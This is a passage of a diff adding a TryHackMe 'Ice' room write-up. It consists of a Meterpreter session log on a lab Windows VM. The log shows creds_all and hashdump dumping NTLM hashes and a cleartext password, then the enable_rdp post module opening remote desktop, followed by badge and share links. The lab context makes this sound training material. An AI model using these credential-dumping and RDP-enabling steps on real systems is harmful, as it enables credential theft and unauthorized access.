+    wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)
+
+meterpreter > 
+
+===================================================================================================================
+meterpreter > creds_all
+[+] Running as SYSTEM
+[*] Retrieving all credentials
+msv credentials
+===============
+
+Username  Domain   LM                                NTLM                              SHA1
+--------  ------   --                                ----                              ----
+Dark      Dark-PC  e52cac67419a9a22ecb08369099ed302  7c4fe5eada682714a036e39378362bab  0d082c4b4f2aeafb67fd0ea568a997e9d3ebc0eb
+
+wdigest credentials
+===================
+
+Username  Domain     Password
+--------  ------     --------
+(null)    (null)     (null)
+DARK-PC$  WORKGROUP  (null)
+Dark      Dark-PC    Password01!
+
+tspkg credentials
+=================
+
+Username  Domain   Password
+--------  ------   --------
+Dark      Dark-PC  Password01!
+
+kerberos credentials
+====================
+
+Username  Domain     Password
+--------  ------     --------
+(null)    (null)     (null)
+Dark      Dark-PC    Password01!
+dark-pc$  WORKGROUP  (null)
+
+
+meterpreter > 
+
+===================================================================================================================
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Dark:1000:aad3b435b51404eeaad3b435b51404ee:7c4fe5eada682714a036e39378362bab:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+meterpreter > run post/windows/manage/enable_rdp
+
+[*] Enabling Remote Desktop
+[*]     RDP is already enabled
+[*] Setting Terminal Services service startup mode
+[*]     The Terminal Services service is not set to auto, changing it to auto ...
+[*]     Opening port in local firewall if necessary
+[*] For cleanup execute Meterpreter resource file: /root/.msf4/loot/20220423023542_default_10.10.150.55_host.windows.cle_049909.txt
+meterpreter > 
+
+===================================================================================================================
+BADGE: https://tryhackme.com/p/AbdulRahimK?show_achievement_badge=ice
+https://twitter.com/intent/tweet?url=https%3A%2F%2Ftryhackme.com/room/ice&via=realtryhackme&text=Ice%20-%20I%20have%20just%20completed%20this%20room!%20Check%20it%20out:%20&hashtags=tryhackme%2Cwindows%2Cnmap%2Cmimikatz%2Cmetasploit%2Cicecast%2Cice
+
+https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Ftryhackme.com
+
+https://www.linkedin.com/sharing/share-offsite/?url=https://tryhackme.com/room/ice
+
+
